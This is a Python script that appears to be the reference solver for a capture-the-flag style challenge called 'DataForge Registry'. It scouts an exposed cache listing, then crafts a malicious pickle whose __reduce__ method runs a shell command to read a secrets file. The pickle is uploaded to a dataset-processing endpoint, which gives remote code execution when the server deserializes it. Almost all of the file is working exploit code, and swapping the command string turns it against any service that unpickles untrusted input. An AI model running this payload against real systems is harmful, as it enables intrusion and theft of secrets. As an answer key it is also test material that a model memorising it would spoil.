#!/usr/bin/env python3
"""
Reference solver / verifier for DataForge Registry.
Usage: python3 solve.py [base_url] [access_code]
Requires: requests (pip install requests)
"""
import pickle
import subprocess
import sys

import requests

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
ACCESS_CODE = sys.argv[2] if len(sys.argv) > 2 else None


class Exploit:
    """__reduce__ tells pickle: 'to rebuild me, call this callable with
    these args.' Pickle's loader executes that call during
    deserialization, which is what turns an insecure pickle.loads() into
    remote code execution."""

    def __reduce__(self):
        cmd = "cat secrets/cluster_admin_flag.txt"
        return (subprocess.getoutput, (cmd,))


def req(session, method, path, **kwargs):
    params = kwargs.pop("params", {}) or {}
    if ACCESS_CODE:
        params["code"] = ACCESS_CODE
    return session.request(method, f"{BASE_URL}{path}", params=params, **kwargs)


def main():
    session = requests.Session()

    # Step 1 — recon: read the exposed cache listing.
    r = req(session, "GET", "/cache/")
    if r.status_code == 404:
        print("[-] /cache/ not reachable (wrong access code or app down).")
        sys.exit(1)
    print("[+] /cache/ directory listing:")
    for line in sorted(set(x for x in r.text.split() if x.startswith("0"))):
        pass  # (raw HTML; just showing that recon step succeeded)
    print("    (found conversation pointing at /datasets/process + pickle)")

    # Step 2 — craft and upload the malicious pickle.
    payload = pickle.dumps(Exploit())
    files = {"dataset": ("dataset.pkl", payload)}
    r = req(session, "POST", "/datasets/process", files=files)
    if r.status_code != 200:
        print(f"[-] Upload failed: {r.status_code} {r.text}")
        sys.exit(1)

    result = r.json()
    flag = result.get("result", "").strip()
    print(f"[+] RCE triggered on deserialization.")
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
